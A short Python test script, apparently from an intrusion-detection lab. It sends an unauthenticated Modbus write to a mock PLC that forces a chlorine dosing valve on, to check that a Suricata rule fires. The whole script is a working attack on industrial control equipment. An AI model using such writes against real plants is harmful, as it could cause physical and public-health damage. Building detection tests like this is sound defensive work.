"""
Attack: Modbus FC5 — Force Single Coil.
Force DosingValve (CO0) to TRUE — turn the chlorine dosing valve on.

Suricata rule sid:2000005 should fire.
"""
import sys
import time

from pymodbus.client import ModbusTcpClient

PLC = "mock-plc"

client = ModbusTcpClient(PLC, port=502, timeout=3)
if not client.connect():
    print(f"[ATTACK-FC5] could not connect to {PLC}:502")
    sys.exit(2)

wr = client.write_coil(address=0, value=True, slave=1)
if wr.isError():
    print(f"[ATTACK-FC5] write failed: {wr}")
    sys.exit(1)

print(f"[ATTACK-FC5] forced DosingValve=ON — Suricata sid:2000005 should fire")
time.sleep(0.3)
client.close()
